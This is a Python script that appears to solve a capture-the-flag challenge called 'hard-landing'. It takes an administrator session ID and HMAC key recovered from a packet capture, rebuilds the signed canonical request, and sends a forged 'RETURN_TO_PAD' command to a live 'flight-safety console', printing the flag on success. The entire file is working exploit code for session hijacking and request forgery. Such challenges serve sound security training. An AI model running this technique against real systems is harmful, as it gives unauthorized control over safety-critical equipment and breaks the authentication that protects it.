#!/usr/bin/env python3
"""
hard-landing — Sentinel flight-safety console recovery.

Recovers the administrator session material from the incident capture, rebuilds the
documented canonical request, signs it with the session-bound HMAC-SHA256 key, and
issues the safe recovery command against the live console.

Canonical string (from GET /api/status):
    POST\n/api/command\n<X-Timestamp>\n<BODY>
Key: the login JSON's 64 lowercase hex chars, decoded to 32 bytes.
Freshness: 300s (use the console's own server_time as the timestamp).
"""

import hashlib
import hmac
import json
import sys
import time
import urllib.error
import urllib.request

# --- recovered from console.pcapng (gzip login responses) -------------------
SESSION = "adm-2aca3785b702d3ef824b9cb8"
KEY = bytes.fromhex(
    "2aca3785b702d3ef824b9cb870481e04e1179b09172a1f9da3710e6bb2a759f1"
)

# --- documented safe recovery command --------------------------------------
BODY = '{"cmd":"RETURN_TO_PAD","pad":"A1"}'
PATH = "/api/command"
USER_AGENT = "sentinel-workstation/1.0"


def canonical(timestamp: int, body: str = BODY) -> str:
    return "POST\n%s\n%d\n%s" % (PATH, timestamp, body)


def sign(timestamp: int, body: str = BODY) -> str:
    return hmac.new(KEY, canonical(timestamp, body).encode(), hashlib.sha256).hexdigest()


def server_status(base: str) -> dict:
    req = urllib.request.Request(base + "/api/status", headers={"User-Agent": USER_AGENT})
    with urllib.request.urlopen(req, timeout=15) as resp:
        return json.loads(resp.read())


def send(base: str, timestamp: int, body: str = BODY, signature: str | None = None,
         content_type: str = "application/json") -> tuple[int, str]:
    sig = signature or sign(timestamp, body)
    req = urllib.request.Request(
        base + PATH,
        data=body.encode(),
        method="POST",
        headers={
            "User-Agent": USER_AGENT,
            "Content-Type": content_type,
            "X-Session": SESSION,
            "X-Timestamp": str(timestamp),
            "X-Signature": sig,
        },
    )
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode()


def main() -> int:
    base = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://w03.ctf.chronos-security.ro:33507"
    status = server_status(base)
    ts = int(status["server_time"])
    skew = int(time.time()) - ts
    print("[status] %s | lockdown=%s | on_pad=%s | server_time=%d | local skew=%+ds"
          % (status["service"], status["state"], status["aircraft_on_pad"], ts, skew))
    print("[canonical] %r" % canonical(ts))
    print("[signature] %s" % sign(ts))

    code, body = send(base, ts)
    print("[live ] HTTP %d %s" % (code, body))
    if code == 200:
        print("[flag ] %s" % json.loads(body)["recovery_receipt"])
    return 0 if code == 200 else 1


if __name__ == "__main__":
    raise SystemExit(main())
